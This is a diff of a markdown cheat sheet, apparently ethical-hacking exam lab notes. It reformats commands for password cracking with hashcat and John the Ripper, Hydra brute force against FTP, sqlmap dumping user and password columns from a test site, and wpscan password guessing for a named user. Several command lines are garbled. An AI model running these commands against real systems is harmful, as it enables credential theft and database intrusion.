@@ -84,15 +84,19 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 
 ### Hashcat
 
-* hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0: MD5 hash mode -a 0: Dictionary attack mode hash.txt txt file containing hash in a compliant format passwordlist.txt: dictionary file containing passwords in plain text
+* `hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0`
+
+> MD5 hash mode -a 0:
+>
+> Dictionary attack mode hash.txt txt file containing hash in a compliant format passwordlist.txt: dictionary file containing passwords in plain text
 
 ### John the Ripper
 
-* john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt&#x20;
+* `john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`&#x20;
 
 ### Hydra
 
-* hydra -L /user.txt -P (password.txt ftp://172.0.16.21&#x20;
+* `hydra -L /user.txt -P (password.txt ftp://172.0.16.21`&#x20;
 
 ### **SQLMap**
 
@@ -102,25 +106,25 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 
 (for cookies- console->document.cookie)
 
-* sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  --dbs   (databases)
-* sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart –tables   (tables)
-* sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users --columns   (columns)
+* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `--dbs   (databases)`
+* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart –tables   (tables)`
+* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users --columns   (columns)`
 
 #### Dump whole table
 
-* sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users  --dump  &#x20;
+* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users  --dump`&#x20;
 
 &#x20;                                                           OR                                                                                   &#x20;
 
 (dump individual  column data)
 
-* sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C uname  --dump &#x20;
-* sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C pass  --dump
-* sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs \[ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod \[ If you have logins credentioals I&#x20;
+* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C uname  --dump` &#x20;
+* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C pass  --dump`
+* `sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs [ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod [ If you have logins credentioals I`&#x20;
 
 ### Snow
 
-* snow.exe -C -p “password” stegfile.txt
+* `snow.exe -C -p “password” stegfile.txt`
 
 ### CrypTool <a href="#effd" id="effd"></a>
 
@@ -132,7 +136,7 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 
 #### Identify psw associated with the User ID "sarah" and resolve the issue to allow her to access her account again. <a href="#effd" id="effd"></a>
 
-* wpscan --url http://192.168.1.10:8080/CEH -u sarah -P passwdlist.txt
+* `wpscan --url http://192.168.1.10:8080/CEH -u sarah -P passwdlist.txt`
 
 or
 
